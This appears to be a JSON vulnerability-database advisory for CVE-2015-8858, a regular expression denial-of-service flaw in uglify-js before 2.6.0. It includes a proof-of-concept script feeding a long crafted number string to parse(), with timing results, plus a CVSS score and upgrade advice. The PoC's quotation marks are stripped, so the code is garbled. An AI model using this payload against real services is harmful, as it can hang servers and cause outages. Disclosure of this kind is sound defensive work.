{
  "id": 48,
  "created_at": "2015-10-24",
  "updated_at": "2016-04-21",
  "title": "Regular Expression Denial of Service",
  "author": {
    "name": "Adam Baldwin",
    "website": null,
    "username": null
  },
  "module_name": "uglify-js",
  "publish_date": "2015-10-24",
  "cves": [
    "CVE-2015-8858"
  ],
  "vulnerable_versions": "<2.6.0",
  "patched_versions": ">=2.6.0",
  "overview": "uglify-js is vulnerable to regular expression denial of service (ReDoS) when certain types of input is passed into .parse().        The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time. [1]        ### Proof of Concept        ```    var u = require(uglify-js);    var genstr = function (len, chr) {        var result = ;        for (i=0; i<=len; i++) {            result = result + chr;        }            return result;    }        u.parse(var a =  + genstr(process.argv[2], 1) + .1ee7;);    ```        ### Results    ```    $ time node test.js 10000    real\t0m1.091s    user\t0m1.047s    sys\t0m0.039s        $ time node test.js 80000    real\t0m6.486s    user\t0m6.229s    sys\t0m0.094s    ```",
  "recommendation": "Update to version 2.6.0 or later",
  "references": [
    "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
  ],
  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
  "cvss_score": 5.3,
  "coordinating_vendor": "^Lift Security"
}
